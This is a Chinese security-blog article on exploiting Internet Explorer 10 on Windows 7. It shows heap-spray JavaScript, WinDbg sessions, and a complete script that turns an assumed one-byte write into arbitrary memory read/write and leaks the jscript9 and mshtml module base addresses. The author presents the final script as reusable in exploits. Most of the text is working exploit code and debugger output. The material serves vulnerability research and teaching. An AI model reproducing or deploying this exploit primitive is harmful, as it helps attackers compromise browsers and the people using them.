# IE：从一字节改写到全地址读写

阅读量 **108678**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-12-01 10:01:26

 **x**

##### 译文声明

本文是翻译文章，文章原作者 SevieZhou

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t0180304367b1cc6bb6.jpg)

作者：SevieZhou

预估稿费：800RMB

**（本篇文章享受双倍稿费 活动链接请**[ **点击此处**](http://bobao.360.cn/news/detail/4370.html)
**）**

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

## 前言

在浏览器的漏洞利用中，通过uaf漏洞能够改写一字节，这时可以利用这篇文章的方法实现任意地址读写，这里会详细阐述技术细节，解释每一步代码的含义，测试环境是win7
32bit sp1和IE10。

## 对象堆喷射

这种方法中通过两次对象的喷射实现地址预测。

首先是第一个对象喷射:

    
    
    <html>
    <head>
    <script language="javascript">
    	(function() {
    		alert("Start");
    		var a = new Array(); 
    		for (var i = 0; i < 0x200; ++i) {
    			a[i] = new Array(0x3c00);
    			if (i == 0x80)
    				buf = new ArrayBuffer(0x58);
    			for (var j = 0; j < a[i].length; ++j)
    				a[i][j] = 0x123;
    		}
    		alert("Done"); 
    	})();
    </script> 
    </head> 
    <body> 
    </body> 
    </html>

目的是把一个ArrayBuffer的缓冲空间放在LargeHeapBlock之间:

    
    
    8-byte header | 0x58-byte LargeHeapBlock
    8-byte header | 0x58-byte LargeHeapBlock
    8-byte header | 0x58-byte LargeHeapBlock
    .
    .
    .
    8-byte header | 0x58-byte LargeHeapBlock
    8-byte header | 0x58-byte ArrayBuffer (buf)
    8-byte header | 0x58-byte LargeHeapBlock
    8-byte header | 0x58-byte LargeHeapBlock

为了追踪内存布局，我们要找到ArrayBuffer对象的地址，在jscript9!Js::JavascriptArrayBuffer::Create下断点，断下后返回:

    
    
    0:007> g
    Breakpoint 0 hit
    eax=00000058 ebx=022e1780 ecx=022fb000 edx=00000400 esi=01ff6890 edi=02e2ba54
    eip=610f2ba8 esp=02e2ba28 ebp=02e2ba48 iopl=0         nv up ei pl nz na po cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200203
    jscript9!Js::JavascriptArrayBuffer::Create:
    610f2ba8 8bff            mov     edi,edi
    0:007> gu
    eax=02426dc0 ebx=022e1780 ecx=00000000 edx=00000000 esi=01ff6890 edi=02e2ba54
    eip=612bc16d esp=02e2ba30 ebp=02e2ba48 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
    jscript9!Js::ArrayBuffer::NewInstance+0x8d:
    612bc16d 5f              pop     edi

eax的值02426dc0就是ArrayBuffer对象的地址:

    
    
    0:006> dd 02426dc0 l9
    02426dc0  610f2bf8 022e9a00 00000000 00000003
    02426dd0  0203c8c0 00000058 00000000 00000000
    02426de0  02426e00
    0:006> ln poi(02426dc0)
    (610f2bf8)   jscript9!Js::JavascriptArrayBuffer::`vftable'   |  (612be1c8)   jscript9!Js::CopyOnWriteObject<Js::TypedArray<bool>,Js::NoSpecialProperties>::`vftable'
    Exact matches:
        jscript9!Js::JavascriptArrayBuffer::`vftable' = <no type information>

+0x10处是缓冲区地址，也就是0203c8c0，这段地址确实在堆上，并且大小为0x58:

    
    
    0:006> !heap -p -a 0203c8c0
        address 0203c8c0 found in
        _HEAP @ 690000
          HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
            0203c8b8 000c 0000  [00]   0203c8c0    00058 - (busy)

定位到这段内存，发现前后都是LargeHeapBlock对象:

    
    
    0203c858 7b0f6577 8c000000 610b1c7c 00000003 <= LargeHeapBlock begin
    0203c868 07ae0000 00000010 00000002 00000000
    0203c878 00000004 07aef440 07af0000 0204fe90
    0203c888 00000000 00000002 00000001 00000000
    0203c898 0204f6d8 07ae0000 00000000 00000000
    0203c8a8 00000000 00000004 00000001 80000000 <= LargeHeapBlock end
    0203c8b8 7b0f656b 88000000 00000000 00000000 <= ArrayBuffer begin
    0203c8c8 00000000 00000000 00000000 00000000
    0203c8d8 00000000 00000000 00000000 00000000
    0203c8e8 00000000 00000000 00000000 00000000
    0203c8f8 00000000 00000000 00000000 00000000
    0203c908 00000000 00000000 00000000 00000000 <= ArrayBuffer end
    0203c918 7b0f655f 8c00aa6c 610b1c7c 00000003 <= LargeHeapBlock begin
    0203c928 07af0000 00000010 00000001 00000000
    0203c938 00000004 07aff020 07b00000 0203c800
    0203c948 00000000 00000001 00000001 00000000
    0203c958 0204f710 07af0000 00000000 00000000
    0203c968 00000000 00000004 00000001 0203aa24 <= LargeHeapBlock end
    
     
    0:006> ln 610b1c7c
    (610b1c7c)   jscript9!LargeHeapBlock::`vftable'   |  (610b1ca0)   jscript9!Segment::`vftable'
    Exact matches:
        jscript9!LargeHeapBlock::`vftable' = <no type information>

接下来是第二次，脚本如下:

    
    
    <html>
    <head>
    <script language="javascript">
    	(function() {
    		alert("Start");
    		var a = new Array(); 
    		for (var i = 0; i < 0x200; ++i) {
    			a[i] = new Array(0x3c00);
    			if (i == 0x80)
    				buf = new ArrayBuffer(0x58);
    			for (var j = 0; j < a[i].length; ++j)
    				a[i][j] = 0x123;
    		}
    		alert("First Done"); 
    		for (; i < 0x200 + 0x400; ++i) {
    			a[i] = new Array(0x3bf8);
    			for (j = 0; j < 0x55; ++j)
    				a[i][j] = new Int32Array(buf);
    		}
    		alert("Second Done");
    	})();
    </script> 
    </head> 
    <body> 
    </body> 
    </html>

这次需要三个断点，在第一个弹窗时下断点:

    
    
    0:013> bu jscript9!Js::ArrayBuffer::NewInstance+0x8d
    0:013> bl
     0 e 612bc16d     0001 (0001)  0:**** jscript9!Js::ArrayBuffer::NewInstance+0x8d
    0:013> g
    Breakpoint 0 hit
    eax=02452dc0 ebx=022e1780 ecx=00000000 edx=00000000 esi=020cf078 edi=02e2ba44
    eip=612bc16d esp=02e2ba20 ebp=02e2ba38 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
    jscript9!Js::ArrayBuffer::NewInstance+0x8d:
    612bc16d 5f              pop     edi
    0:007> ln poi(eax)
    (610f2bf8)   jscript9!Js::JavascriptArrayBuffer::`vftable'   |  (612be1c8)   jscript9!Js::CopyOnWriteObject<Js::TypedArray<bool>,Js::NoSpecialProperties>::`vftable'
    Exact matches:
        jscript9!Js::JavascriptArrayBuffer::`vftable' = <no type information>
    0:007> dd eax l9
    02452dc0  610f2bf8 022e9a20 00000000 00000003
    02452dd0  087cc3c0 00000058 00000000 00000000
    02452de0  02452e00

这里获得了第一次喷射中ArrayBuffer对象信息，布置的缓冲区地址为087cc3c0。

然后继续，当第二个弹窗出现时，下另外两个断点:

    
    
    0:004> bl
     0 e 612bc16d     0001 (0001)  0:**** jscript9!Js::ArrayBuffer::NewInstance+0x8d
     1 e 61164589     0001 (0001)  0:**** jscript9!Js::JavascriptArray::DirectSetItem_Full+0x405
     2 e 612bdae6     0001 (0001)  0:**** jscript9!Js::TypedArrayBase::CreateNewInstance+0x1f1

当第一次断在断点1时，esi存放了Array对象的地址:

    
    
    0:007> g
    Breakpoint 1 hit
    eax=093b1010 ebx=00000000 ecx=00003bf8 edx=093b1010 esi=092b3ce0 edi=00003bf8
    eip=61164589 esp=02e2b9c8 ebp=02e2b9fc iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::JavascriptArray::DirectSetItem_Full+0x405:
    61164589 894614          mov     dword ptr [esi+14h],eax ds:0023:092b3cf4=610be460
    0:007> ln poi(esi)
    (610b2f78)   jscript9!Js::JavascriptArray::`vftable'   |  (610b30e0)   jscript9!Js::JavascriptError::`vftable'
    Exact matches:
        jscript9!Js::JavascriptArray::`vftable' = <no type information>
    0:007> p
    eax=093b1010 ebx=00000000 ecx=00003bf8 edx=093b1010 esi=092b3ce0 edi=00003bf8
    eip=6116458c esp=02e2b9c8 ebp=02e2b9fc iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::JavascriptArray::DirectSetItem_Full+0x408:
    6116458c 8955e8          mov     dword ptr [ebp-18h],edx ss:0023:02e2b9e4=00003bf8
    0:007> 
    eax=093b1010 ebx=00000000 ecx=00003bf8 edx=093b1010 esi=092b3ce0 edi=00003bf8
    eip=6116458f esp=02e2b9c8 ebp=02e2b9fc iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::JavascriptArray::DirectSetItem_Full+0x40b:
    6116458f 895618          mov     dword ptr [esi+18h],edx ds:0023:092b3cf8=610be460
    0:007> 
    eax=093b1010 ebx=00000000 ecx=00003bf8 edx=093b1010 esi=092b3ce0 edi=00003bf8
    eip=61164592 esp=02e2b9c8 ebp=02e2b9fc iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::JavascriptArray::DirectSetItem_Full+0x40e:
    61164592 e90390f9ff      jmp     jscript9!Js::JavascriptArray::DirectSetItem_Full+0x23 (610fd59a)
    0:007> dd esi
    092b3ce0  610b2f78 022e9a40 00000000 00000003
    092b3cf0  00003bf8 093b1010 093b1010 00000000
    092b3d00  00000000 00000000 00000000 00000000
    092b3d10  00000000 00000000 00000000 00000000
    092b3d20  00000000 00000000 00000000 00000000
    092b3d30  00000000 00000000 00000000 00000000
    092b3d40  00000000 00000000 00000000 00000000
    092b3d50  00000000 00000000 00000000 00000000
    0:007> dd 093b1010
    093b1010  00000000 00003bf8 00003bf8 00000000
    093b1020  00000000 00000000 00000000 00000000
    093b1030  00000000 00000000 00000000 00000000
    093b1040  00000000 00000000 00000000 00000000
    093b1050  00000000 00000000 00000000 00000000
    093b1060  00000000 00000000 00000000 00000000
    093b1070  00000000 00000000 00000000 00000000
    093b1080  00000000 00000000 00000000 00000000

这里得到Array对象地址092b3ce0，数组地址093b1010，看到现在数组里还没有元素，但长度是我们设置的00003bf8，然后断在断点2时:

    
    
    0:007> g
    Breakpoint 2 hit
    eax=092b70f0 ebx=02452dc0 ecx=02038678 edx=00000000 esi=088b9848 edi=00000016
    eip=612bdae6 esp=02e2b9f0 ebp=02e2ba10 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    jscript9!Js::TypedArrayBase::CreateNewInstance+0x1f1:
    612bdae6 8bf0            mov     esi,eax
    0:007> ln poi(eax)
    (610b38c8)   jscript9!Js::TypedArray<int>::`vftable'   |  (610b3a20)   jscript9!Js::TypedArray<unsigned short>::`vftable'
    Exact matches:
        jscript9!Js::TypedArray<int>::`vftable' = <no type information>

得到Int32Array对象的地址092b70f0，断下三次后:

    
    
    0:007> dd 092b70f0 
    092b70f0  610b38c8 022e9880 00000000 00000003 <= 第一次
    092b7100  00000004 00000000 00000016 02038678
    092b7110  02452dc0 00000000 00000000 00000000
    092b7120  610b38c8 022e9880 00000000 00000003 <= 第二次
    092b7130  00000004 00000000 00000016 02038678
    092b7140  02452dc0 00000000 00000000 00000000
    092b7150  610b38c8 022e9880 00000000 00000003 <= 第三次
    092b7160  00000004 00000000 00000016 02038678

每个对象偏移0x18是数组大小，也就是ArrayBuffer的缓冲区0x58/4=0x16，偏移0x1c是我们第一次喷射得到的0x58
bytes的缓冲区地址，现在Array对象指向的数组:

    
    
    0:007> dd 093b1010
    093b1010  00000000 00003bf8 00003bf8 00000000
    093b1020  092b70c0 092b70f0 092b7120 00000000
    093b1030  00000000 00000000 00000000 00000000
    093b1040  00000000 00000000 00000000 00000000
    093b1050  00000000 00000000 00000000 00000000
    093b1060  00000000 00000000 00000000 00000000
    093b1070  00000000 00000000 00000000 00000000
    093b1080  00000000 00000000 00000000 00000000

填入了三个Int32Array的地址。至于Array[0]处的092b70c0，是在创建Array对象之前构造的，不知道是什么原因。

第二次喷射中每块的大小可以这么计算:

    
    
    0x3bf8 数组大小 * 4 bytes + 0x20 头部 + 0x55 * 0x30 每个Int32Array对象大小 
    = 0xfff0

Array在内存中是对齐的，所以每次实际喷射了0x10000 bytes。

喷射完后查看预测地址0c0a0000:

    
    
    0c0a0000 00000000 0000eff0 00000000 00000000
    0c0a0010 00000000 00003bf8 00003bf8 00000000
    0c0a0020 0c09fa20 0c09fa50 0c09fa80 0c09fab0
    0c0a0030 0c09fae0 0c09fb10 0c09fb40 0c09fb70
    0c0a0040 0c09fba0 0c09fbd0 0c09fc00 0c09fc30
    0c0a0050 0c09fc60 0c09fc90 0c09fcc0 0c09fcf0
    0c0a0060 0c09fd20 0c09fd50 0c09fd80 0c09fdb0
    0c0a0070 0c09fde0 0c09fe10 0c09fe40 0c09fe70
    0c0a0080 0c09fea0 0c09fed0 0c09ff00 0c09ff30
    0c0a0090 0c09ff60 0c09ff90 0c09ffc0 0c0af000
    0c0a00a0 0c0af030 0c0af060 0c0af090 0c0af0c0
    0c0a00b0 0c0af0f0 0c0af120 0c0af150 0c0af180
    0c0a00c0 0c0af1b0 0c0af1e0 0c0af210 0c0af240
    0c0a00d0 0c0af270 0c0af2a0 0c0af2d0 0c0af300
    0c0a00e0 0c0af330 0c0af360 0c0af390 0c0af3c0
    0c0a00f0 0c0af3f0 0c0af420 0c0af450 0c0af480
    0c0a0100 0c0af4b0 0c0af4e0 0c0af510 0c0af540
    0c0a0110 0c0af570 0c0af5a0 0c0af5d0 0c0af600
    0c0a0120 0c0af630 0c0af660 0c0af690 0c0af6c0
    0c0a0130 0c0af6f0 0c0af720 0c0af750 0c0af780
    0c0a0140 0c0af7b0 0c0af7e0 0c0af810 0c0af840
    0c0a0150 0c0af870 0c0af8a0 0c0af8d0 0c0af900
    0c0a0160 0c0af930 0c0af960 0c0af990 0c0af9c0
    0c0a0170 0c0af9f0 00000000 00000000 00000000

可以在偏移0x3bf8*4处找到Int32Array对象:

    
    
    0c0aefe0 00000000 00000000 00000000 00000000
    0c0aeff0 00000000 00000000 00000000 00000000
    0c0af000 610b38c8 022e9880 00000000 00000003 <= Int32Array
    0c0af010 00000004 00000000 00000016 02038678
    0c0af020 02452dc0 00000000 00000000 00000000
    0c0af030 610b38c8 022e9880 00000000 00000003

喷射布局:

    
    
    0x0: ArrayDataHead
    0x20: array[0] address
    0x24: array[1] address
    ...
    0xeff0c array[3bf7] address
    0xf000: Int32Array
    0xf030: Int32Array
    ...
    0xffc0: Int32Array
    0xfff0: align data

##

## 改写一字节

假设我们通过某个漏洞能够修改指定地址的一字节值，那么如果修改了0c0af01b的一字节，假设改为了20，那么数组长度就会变成20000016，那么就可以读写02038678往后的20000016*4字节的空间，调试的时候选择在Second
Done弹窗后手动修改0c0af018处的值为20000016。

修改完后可以使用下面的代码找到我们修改的对象:

    
    
    int32array = 0;
    for (var i = 0x200; i < 0x200 + 0x400; +i) {
    	for (var j = 0; j < 0x55; ++j) {
    		if (a[i][j].length != 0x58/4) {
    			int32array = a[i][j];
    			break;
    		}
    	}
    	if (int32array != 0)
    		break;
    }
    
    if (int32array == 0) {
    	alert("Not found");
    	window.location.reload();
    	return;
    }
    alert("Done");

由于我们喷射的ArrayBuffer的空间是处于LargeHeapBlock之间的，所以首先可以获取LargeHeapBlock对象的虚表地址，这样就可以确定模块基地址，我们还知道LargeHeapBlock对象是链表的形式在内存中，所以可以通过链表指针来验证ArrayBuffer的位置是否正确，每个LargeHeapBlock对象偏移0x24处指针指向下一个对象:

    
    
    02388a08 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
    02388a28 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
    02388a48 00000000 00000000 00000000 00000000 00000000 00000000 5f143c14 8c000000
    02388a68 609e1c7c 00000003 04ac0000 00000010 00000001 00000000 00000004 04acf020 <= LargeHeapBlock
    02388a88 04ad0000 02388ac8 00000000 00000001 00000001 00000000 022fac28 04ac0000
    02388aa8 00000000 00000000 00000000 00000004 00000001 80000000 5f143c00 8c000000
    02388ac8 609e1c7c 00000003 04ad0000 00000010 00000001 00000000 00000004 04adf020 <= LargeHeapBlock
    02388ae8 04ae0000 02388b28 00000000 00000001 00000001 00000000 022fac28 04ad0000
    02388b08 00000000 00000000 00000000 00000004 00000001 00000000 5f143c3c 8c000000
    02388b28 609e1c7c 00000003 04d10000 00000010 00000001 00000000 00000004 04d1f020 <= LargeHeapBlock
    02388b48 04d20000 02388b88 00000000 00000001 00000001 00000000 022fac60 04d10000
    02388b68 00000000 00000000 00000000 00000004 00000001 00000000 5f143c28 8c000000

这样也可以验证我们的喷射是否成功，代码如下:

    
    
    var vfptr1 = int32array[0x60/4];
    var vfptr2 = int32array[0x60*2/4];
    var vfptr3 = int32array[0x60*3/4];
    var nextPtr1 = int32array[(0x60+0x24)/4];
    var nextPtr2 = int32array[(0x60*2+0x24)/4];
    var nextPtr3 = int32array[(0x60*3+0x24)/4];
    if (vfptr1 & 0xffff != 0x1c7c || vfptr1 != vfptr2 || vfptr2 != vfptr3 ||
    	nextPtr2 - nextPtr1 != 0x60 || nextPtr3 - nextPtr2 != 0x60) {
    	alert("Error!");
    	window.location.reload();
    	return;
    }
    var buf_addr = nextPtr1 - 0x60*2;
    alert("Done");
    alert(buf_addr);

经过几次页面的刷新，最终得到了buf_addr的地址01eb44b0，在调试器里验证与之一致:

    
    
    01eb44b0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
    01eb44d0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
    01eb44f0 00000000 00000000 00000000 00000000 00000000 00000000 1cba62e6 8c00203d
    01eb4510 630d1c7c 00000003 0ce40000 00000010 00000001 00000000 00000004 0ce4f020

##

## 任意地址读写

下一步需要改写0c0af01c处的ArrayBuffer地址为0，这样就可以实现全地址空间读写，目前脚本如下:

    
    
    <html>
    <head>
    <script language="javascript">
    	(function() {
    		CollectGarbage();
    
    		alert("Start");
    		var a = new Array(); 
    		for (var i = 0; i < 0x200; ++i) {
    			a[i] = new Array(0x3c00);
    			if (i == 0x80)
    				buf = new ArrayBuffer(0x58);
    			for (var j = 0; j < a[i].length; ++j)
    				a[i][j] = 0x123;
    		}
    		alert("First Done"); 
    		for (; i < 0x200 + 0x400; ++i) {
    			a[i] = new Array(0x3bf8);
    			for (j = 0; j < 0x55; ++j)
    				a[i][j] = new Int32Array(buf);
    		}
    		alert("Second Done");
    
    		int32array = 0;
    		for (var i = 0x200; i < 0x200 + 0x400; ++i) {
    			for (var j = 0; j < 0x55; ++j) {
    				if (a[i][j].length != 0x58/4) {
    					int32array = a[i][j];
    					break;
    				}
    			}
    			if (int32array != 0)
    				break;
    		}
    
    		if (int32array == 0) {
    			alert("Not found");
    			window.location.reload();
    			return;
    		}
    		alert("found");
    		var vfptr1 = int32array[0x60/4];
    		var vfptr2 = int32array[0x60*2/4];
    		var vfptr3 = int32array[0x60*3/4];
    		var nextPtr1 = int32array[(0x60+0x24)/4];
    		var nextPtr2 = int32array[(0x60*2+0x24)/4];
    		var nextPtr3 = int32array[(0x60*3+0x24)/4];
    		if (vfptr1 & 0xffff != 0x1c7c || vfptr1 != vfptr2 || vfptr2 != vfptr3 ||
    			nextPtr2 - nextPtr1 != 0x60 || nextPtr3 - nextPtr2 != 0x60) {
    			alert("Error!");
    			window.location.reload();
    			return;
    		}
    		var buf_addr = nextPtr1 - 0x60*2;
    		alert("Third Done");
    		alert(buf_addr);
    
    		if (int32array[(0x0c0af000+0x1c-buf_addr)/4] != buf_addr) {
    			alert("Error");
    			window.location.reload();
    			return;
    		}
    
    		int32array[(0x0c0af000+0x18-buf_addr)/4] = 0x20000000;  // length
    		int32array[(0x0c0af000+0x1c-buf_addr)/4] = 0;  // new ArrayBuffer addr
    		alert("Fourth Done");
    	})();
    
    </script> 
    </head> 
    <body> 
    </body> 
    </html>

改写后可以读写全地址空间，但读写地址时需要是4的倍数，需要实现读写函数解决地址不是4倍数的情况:

    
    
    function read(address) {
    
    	var k = address & 3;
    	if (k == 0) {
    		return int32array[address/4];
    	} else {
    		alert("to debug");
    		return (int32array[(address-k)/4]>>k*8 | (int32array[(address-k+4)/4] << (32-k*8)));
    	}
    }
    
    function write(address,value) {
    
    	var k = address & 3;
    	if (k == 0) {
    		int32array[address/4] = value;
    	} else {
    		alert("to debug");
    		var low = int32array[(address-k)/4];
    		var high = int32array[(address-k+4)/4];
    		var mask = (1<<k*8)-1;
    		low = (low & mask) | (value << k*8);
    		high = (high & (0xffffffff - mask)) | (value >> (32 - k*8));
    		int32array[(address-k)/4] = low;
    		int32array[(address-k+4)/4] = high;
    	}
    }

##

## 泄露对象地址

为了确定模块的基地址，还需要能够得到任意对象的地址，这里利用到了Array数组，把一个对象赋给数组的最后一个元素，然后通过读地址读出对象的地址。具体实现如下:

    
    
    for (var i = 0x200; i < 0x200 + 0x400; ++i)
    	a[i][0x3bf7] = 0;
    
    write(0x0c0af000-4,3);
    leakArray = 0;
    for (var i = 0x200; i < 0x200 + 0x400; ++i) {
    	if (a[i][0x3bf7] != 0){
    		leakArray = a[i];
    		break;
    	}
    }
    if (leakArray == 0) {
    	alert("Error");
    	window.location.reload();
    	return;
    }
    
    function get_addr(obj) {
    	leakArray[0x3bf7] = obj;
    	return read(0x0c0af000-4);
    }

首先把每个Array的最后一个元素置0，然后把0x0c0a0000处的数组最后一个元素置为3，然后找到这个数组，把对象的引用赋值给数组最后一个元素，再用read函数读出来。比如可以这样确定jscript9和mshtml的基地址:

jscript9的地址可以通过Int32Array的虚表计算:

    
    
    0:017> lmm jscript9
    start    end        module name
    630d0000 63392000   jscript9   (pdb symbols)          c:\symbols\jscript9.pdb\6E55E6B5AC4B4699BFCF4B58510435202\jscript9.pdb
    0:017> ln 630d38c8
    (630d38c8)   jscript9!Js::TypedArray<int>::`vftable'   |  (630d3a20)   jscript9!Js::TypedArray<unsigned short>::`vftable'
    Exact matches:
        jscript9!Js::TypedArray<int>::`vftable' = <no type information>
    0:017> ? 630d38c8-630d0000
    Evaluate expression: 14536 = 000038c8

先通过数组，先看看div对象:

    
    
    leakArray[0x3bf7] = document.createElement("div");

得到的div对象:

    
    
    0529a0c0 630d2ad0 jscript9!Js::CustomExternalObject::`vftable'
    0529a0c4 0ce5adc0 
    0529a0c8 00000000 
    0529a0cc 00000003 
    0529a0d0 6372d05d MSHTML!CBaseTypeOperations::CBaseFinalizer
    0529a0d4 00000000 
    0529a0d8 02531ff0 
    0529a0dc 00000000 
    ...

偏移0x10处是CBaseTypeOperations::CBaseFinalizer对象，可以用这个来计算mshtml的基地址:

    
    
    0:002> ln 6372d05d
    (6372d05d)   MSHTML!CBaseTypeOperations::CBaseFinalizer   |  (6372d11a)   MSHTML!CElement::JSBind_Unroot
    Exact matches:
        MSHTML!CBaseTypeOperations::CBaseFinalizer = <no type information>
    0:002> lmm mshtml
    start    end        module name
    636f0000 644ad000   MSHTML     (pdb symbols)          c:\symbols\mshtml.pdb\98191859560C471FB6BA0B1D33DAACCB2\mshtml.pdb
    0:002> ? 6372d05d-636f0000 
    Evaluate expression: 249949 = 0003d05d

综合如下:

    
    
    var jscript9 = read(0x0c0af000) - 0x38c8;
    var addr = get_addr(document.createElement("div")); 
    var mshtml = read(addr + 0x10) - 0x3d05d;

得到结果:

    
    
    mshtml at: 636f0000
    jscript9 at: 630d0000 

与实际结果一致:

    
    
    0:005> lmm mshtml
    start    end        module name
    636f0000 644ad000   MSHTML     (deferred)             
    0:005> lmm jscript9
    start    end        module name
    630d0000 63392000   jscript9   (pdb symbols)          c:\symbols\jscript9.pdb\6E55E6B5AC4B4699BFCF4B58510435202\jscript9.pdb

## 总结

脚本总结如下:

    
    
    <html>
    <head>
    <script language="javascript">
    	(function() {
    		CollectGarbage();
    
    		alert("Start");
    		var a = new Array(); 
    		for (var i = 0; i < 0x200; ++i) {
    			a[i] = new Array(0x3c00);
    			if (i == 0x80)
    				buf = new ArrayBuffer(0x58);
    			for (var j = 0; j < a[i].length; ++j)
    				a[i][j] = 0x123;
    		}
    		alert("First Done"); 
    		for (; i < 0x200 + 0x400; ++i) {
    			a[i] = new Array(0x3bf8);
    			for (j = 0; j < 0x55; ++j)
    				a[i][j] = new Int32Array(buf);
    		}
    		alert("Second Done");
    
    		int32array = 0;
    		for (var i = 0x200; i < 0x200 + 0x400; ++i) {
    			for (var j = 0; j < 0x55; ++j) {
    				if (a[i][j].length != 0x58/4) {
    					int32array = a[i][j];
    					break;
    				}
    			}
    			if (int32array != 0)
    				break;
    		}
    
    		if (int32array == 0) {
    			alert("Not found");
    			window.location.reload();
    			return;
    		}
    		alert("found");
    		var vfptr1 = int32array[0x60/4];
    		var vfptr2 = int32array[0x60*2/4];
    		var vfptr3 = int32array[0x60*3/4];
    		var nextPtr1 = int32array[(0x60+0x24)/4];
    		var nextPtr2 = int32array[(0x60*2+0x24)/4];
    		var nextPtr3 = int32array[(0x60*3+0x24)/4];
    		if (vfptr1 & 0xffff != 0x1c7c || vfptr1 != vfptr2 || vfptr2 != vfptr3 ||
    			nextPtr2 - nextPtr1 != 0x60 || nextPtr3 - nextPtr2 != 0x60) {
    			alert("Error!");
    			window.location.reload();
    			return;
    		}
    		var buf_addr = nextPtr1 - 0x60*2;
    		alert("Third Done");
    		alert(buf_addr);
    
    		if (int32array[(0x0c0af000+0x1c-buf_addr)/4] != buf_addr) {
    			alert("Error");
    			window.location.reload();
    			return;
    		}
    
    		int32array[(0x0c0af000+0x18-buf_addr)/4] = 0x20000000;  // length
    		int32array[(0x0c0af000+0x1c-buf_addr)/4] = 0;  // new ArrayBuffer addr
    		alert("Fourth Done");
    
    		function read(address) {
    
    			var k = address & 3;
    			if (k == 0) {
    				return int32array[address/4];
    			} else {
    				alert("to debug");
    				return (int32array[(address-k)/4]>>k*8 | (int32array[(address-k+4)/4] << (32-k*8)));
    			}
    		}
    
    		function write(address,value) {
    
    			var k = address & 3;
    			if (k == 0) {
    				int32array[address/4] = value;
    			} else {
    				alert("to debug");
    				var low = int32array[(address-k)/4];
    				var high = int32array[(address-k+4)/4];
    				var mask = (1<<k*8)-1;
    				low = (low & mask) | (value << k*8);
    				high = (high & (0xffffffff - mask)) | (value >> (32 - k*8));
    				int32array[(address-k)/4] = low;
    				int32array[(address-k+4)/4] = high;
    			}
    		}
    
    		for (var i = 0x200; i < 0x200 + 0x400; ++i)
    			a[i][0x3bf7] = 0;
    
    		write(0x0c0af000-4,3);
    		leakArray = 0;
    		for (var i = 0x200; i < 0x200 + 0x400; ++i) {
    			if (a[i][0x3bf7] != 0){
    				leakArray = a[i];
    				break;
    			}
    		}
    		if (leakArray == 0) {
    			alert("Error");
    			window.location.reload();
    			return;
    		}
    
    		function get_addr(obj) {
    			leakArray[0x3bf7] = obj;
    			return read(0x0c0af000-4);
    		}
    		alert("Fifth Done");
    		var jscript9 = read(0x0c0af000) - 0x38c8;
    		var addr = get_addr(document.createElement("div")); 
    		var mshtml = read(addr + 0x10) - 0x3d05d;
    
    		document.write("mshtml at: "+mshtml.toString(16));
    		document.write("<br>");
    		document.write("jscript9 at: "+jscript9.toString(16));
    	})();
    
    </script> 
    </head> 
    <body> 
    </body> 
    </html>

这是通用的方法，稍加修改就可以放在exp中实现任意地址的读写。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **seviezhou** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/87922](/post/id/87922)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [浏览器](/tag/浏览器)

 **+1** __1赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) seviezhou

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

